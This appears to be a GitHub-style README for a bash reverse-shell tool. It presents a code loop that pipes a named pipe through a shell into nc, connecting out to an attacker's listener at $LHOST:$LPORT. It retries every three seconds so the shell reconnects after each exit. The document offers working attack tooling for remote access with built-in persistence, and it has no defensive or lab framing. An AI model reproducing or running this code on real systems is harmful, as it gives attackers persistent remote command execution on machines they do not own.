# bash-reverse-shell
reverse shell bash using nc

# persistent mode
this script has persistent mode, when user done with the shell and exit.. it will still trying to connect to the target listener port

```
        while true # just loop, nothing special
        do
                cat /tmp/zeusPipe|$0 shell 2>&1|nc $LHOST $LPORT >/tmp/zeusPipe # trying to connect to the listener
                sleep 3 # sleep 3 second when listener not open the port or after user exit the shell
        done
```

# no idle mode :(
there's no idle mode currently 
